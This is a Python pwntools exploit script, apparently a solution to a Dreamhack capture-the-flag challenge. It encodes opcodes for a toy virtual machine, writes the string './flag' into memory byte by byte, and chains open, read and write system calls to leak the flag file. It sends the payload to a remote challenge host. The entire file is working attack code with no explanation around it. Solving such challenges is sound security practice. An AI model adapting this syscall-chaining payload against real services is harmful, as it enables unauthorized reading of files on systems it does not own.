#!/usr/bin/env python3

from pwn import *

class Instruction:
    def __init__(self):
        self.reg = {'a': b'\x01', 'b': b'\x02', 'c': b'\x04', 'd': b'\x08'}

    def mov(self, sel, val):
        self.sel = sel
        self.val = val

        self.payload = b'\x01'
        self.payload += self.reg[self.sel]
        self.payload += bytes([self.val])
        return self.payload

    def add(self, sel, val):
        self.sel = sel
        self.val = val

        self.payload = b'\x02'
        self.payload += self.reg[self.sel]
        self.payload += bytes([self.val])
        return self.payload

    def lea(self, sel1, sel2):
        self.sel1 = sel1
        self.sel2 = sel2

        self.payload = b'\x04'
        self.payload += self.reg[self.sel1]
        self.payload += self.reg[self.sel2]
        return self.payload

    def sys(self, sel1, sel2):
        self.act = {"open": b'\x01', "read": b'\x02', "write": b'\x04'}
        self.sel1 = self.act[sel1]
        self.sel2 = sel2

        self.payload = b'\x08'
        self.payload += self.sel1
        self.payload += self.reg[self.sel2]
        return self.payload

def exploit(r, inst):
    # set "./flag" string to open arg1
    payload = inst.mov('c', 0x00)
    payload += inst.mov('d', 0x2e)
    payload += inst.lea('c', 'd')
    payload += inst.add('c', 0x01)
    payload += inst.mov('d', 0x2f)
    payload += inst.lea('c', 'd')
    payload += inst.add('c', 0x01)
    payload += inst.mov('d', 0x66)
    payload += inst.lea('c', 'd')
    payload += inst.add('c', 0x01)
    payload += inst.mov('d', 0x6c)
    payload += inst.lea('c', 'd')
    payload += inst.add('c', 0x01)
    payload += inst.mov('d', 0x61)
    payload += inst.lea('c', 'd')
    payload += inst.add('c', 0x01)
    payload += inst.mov('d', 0x67)
    payload += inst.lea('c', 'd')
    # call open("./flag", 0x00)
    payload += inst.sys("open", 'a')

    # Set arg for read()
    payload += inst.mov('b', 0x10)
    payload += inst.mov('c', 0x40)
    # call read(fd, mem1 + 0x10, 0x40)
    payload += inst.sys("read", 'c')

    # Set arg for write()
    payload += inst.mov('a', 0x01)
    payload += inst.mov('b', 0x10)
    # call write(0x1, mem1 + 0x10, len)
    payload += inst.sys("write", 'd')

    r.sendafter(":", payload)
    r.interactive()

def main(r):
    inst = Instruction()
    exploit(r, inst)

if __name__ == "__main__":
    #r = remote("localhost", 9929)
    r = remote("host3.dreamhack.games", 11946)
    main(r)

